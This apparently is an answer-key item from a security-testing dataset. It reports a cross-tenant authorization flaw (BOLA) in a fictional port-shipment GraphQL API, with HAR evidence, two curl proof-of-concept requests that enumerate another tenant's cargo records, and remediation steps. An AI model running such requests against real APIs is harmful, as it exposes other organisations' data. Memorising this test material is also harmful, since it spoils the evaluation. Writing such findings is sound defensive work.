# Expected Response

## System
- Domain: Marine / Port Operations
- System: HarborFlow Port API
- Example ID: GQL-0091

## Priority Findings

### Finding 1: Cross-Tenant Port Shipment Bulk List Endpoint BOLA (Pattern 1.3)
**Severity:** Critical
**Category:** BOLA / Bulk Endpoints

**Summary:**
Per §5.0 (Pattern 1.3 — bulk or list endpoints): The `listShipments` endpoint accepts client-supplied `tenantId` instead of using the JWT. An attacker from `tenant-a61d` passed `tenantId: "tenant-f744"` to enumerate port shipment records belonging to another maritime operator. In port operations, this exposes cargo manifests, vessel schedules, customs declarations, and hazardous materials records.

**Evidence from HAR:**
- Request: `POST https://api.harborflow-port-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-a61d`
- Query: `listShipments(tenantId: "tenant-f744") { shipmentId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-f744"`, `ownerId: "other-user-a61df744"`, `sensitiveField: "CONFIDENTIAL-a61df744"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-a61df744`
- Note: Domain objects are `Shipment`/`shipmentId` with `listShipments`/`getShipment` resolvers (confirmed by HAR response `getShipment`).

## Steps to Reproduce

### Step 1 — Cross-tenant shipment list (HAR)
```bash
curl -s -X POST https://api.harborflow-port-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a61d" \
  -d '{"query": "query VulnerableOp { listShipments(tenantId: \"tenant-f744\") { shipmentId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-a61df744` from `tenant-f744`. **Secure:** FORBIDDEN.

### Step 2 — Bulk shipment lookup
```bash
curl -s -X POST https://api.harborflow-port-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a61d" \
  -d '{"query": "mutation { bulkShipmentLookup(ids: [\"S-2091\", \"S-1091\", \"S-3091\"]) { shipmentId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Cross-tenant cargo records returned.

## Remediation
1. `listShipments` must use JWT `tenantId` — discard client argument.
2. Per-ID ownership filter in `bulkShipmentLookup`.
3. Resolver tenant guard: `WHERE shipment_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `shipment:{tenantId}:{shipmentId}`.
